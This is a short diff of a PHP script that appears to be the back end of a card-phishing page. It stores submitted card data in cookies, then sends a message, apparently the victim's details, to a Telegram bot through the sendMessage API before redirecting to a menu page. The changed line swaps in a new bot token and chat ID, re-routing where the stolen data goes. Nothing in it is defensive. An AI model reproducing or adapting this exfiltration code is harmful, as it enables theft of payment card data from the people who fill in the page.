@@ -30,7 +30,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
              setcookie("cardcashed",$x, time()+3600, "/","", 0);
 
              setcookie("card",$_POST['3'], time()+3600, "/","", 0);
-             file_get_contents("https://api.telegram.org/bot6163763691:AAF8lykGO6zvKFIfFJ1w9JVDNc2qxuMs3p8/sendMessage?chat_id=1026295403&text=" . urlencode($message)."" );
+             file_get_contents("https://api.telegram.org/bot6122494476:AAHw3y87SQbDVg2suTMbuAkwFEFmvSCTQUs/sendMessage?chat_id=-4091358695&text=" . urlencode($message)."" );
 
         header("Location: ../menu.php");
 } else
